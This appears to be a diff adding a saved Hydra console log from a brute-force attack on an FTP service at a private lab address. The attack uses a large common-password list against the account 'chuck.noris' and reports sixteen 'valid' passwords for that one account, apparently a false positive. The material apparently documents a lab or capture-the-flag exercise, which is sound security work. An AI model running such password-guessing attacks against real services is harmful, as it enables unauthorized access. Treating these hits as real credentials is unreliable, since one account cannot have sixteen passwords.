@@ -1,0 +1,23 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-24 18:59:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.150.150.212:21/
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: 123456
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: 12345
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: 123456789
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: password
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: iloveyou
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: princess
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: 1234567
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: rockyou
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: 12345678
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: abc123
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: nicole
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: daniel
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: monkey
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: babygirl
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: lovely
+[21][ftp] host: 10.150.150.212   login: chuck.noris   password: jessica
+1 of 1 target successfully completed, 16 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-24 18:59:18
